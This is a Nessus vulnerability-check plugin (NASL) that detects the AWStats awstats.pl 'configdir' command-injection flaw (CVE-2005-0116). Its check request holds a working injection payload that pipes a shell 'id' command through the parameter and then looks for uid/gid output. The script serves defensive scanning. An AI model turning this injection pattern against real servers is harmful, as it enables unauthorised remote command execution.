#
# This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
#
# Ref: iDEFENSE 
#
# This script is released under the GNU GPLv2
#
# changes by rd: changed the web reqeuest
# changes by mehul : added code to use awstats_detect.nasl for detection.


include("compat.inc");

if(description)
{
 script_id(16189);
 script_version("$Revision: 1.11 $");

 script_cve_id("CVE-2005-0116");
 script_bugtraq_id(12270, 12298);
 script_xref(name:"OSVDB", value:"13002");

 script_name(english:"AWStats awstats.pl configdir Parameter Arbitrary Command Execution");
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a CGI script that allows execution of
arbitrary commands." );
 script_set_attribute(attribute:"description", value:
"The remote host is running AWStats, a free logfile analysis tool for
analyzing ftp, mail, web, ...  traffic.

The remote version of this software fails to sanitize user-supplied
input to the 'configdir' parameter of the 'awstats.pl' script.  An
attacker may exploit this condition to execute commands remotely or
disclose contents of files, subject to the privileges under which the
web server operates." );
 script_set_attribute(attribute:"see_also", value:"http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=185" );
 script_set_attribute(attribute:"see_also", value:"http://awstats.sourceforge.net/docs/awstats_changelog.txt" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to AWStats version 6.3 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );

script_end_attributes();

 
 summary["english"] = "Determines the presence of AWStats awstats.pl flaws";

 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 script_copyright(english:"This script is Copyright (C) 2005-2009 David Maciejak");
 script_family(english:"CGI abuses");
 
 script_dependencies("awstats_detect.nasl");
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_ports("Services/www", 80);

 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if ( ! port ) exit(0);
if (get_kb_item("Services/www/"+port+"/embedded")) exit(0);

# Test an install.
install = get_kb_item(string("www/", port, "/AWStats"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");

if (!isnull(matches))
{ 
  dir = matches[2];
  http_check_remote_code (
			extra_dirs:make_list(dir),
			extra_check:"Check config file, permissions and AWStats documentation",
			check_request:"/awstats.pl?configdir=|echo%20Content-Type:%20text/html;%20echo%20;id|%00",
			check_result:"uid=[0-9]+.*gid=[0-9]+.*",
			command:"id" );
}
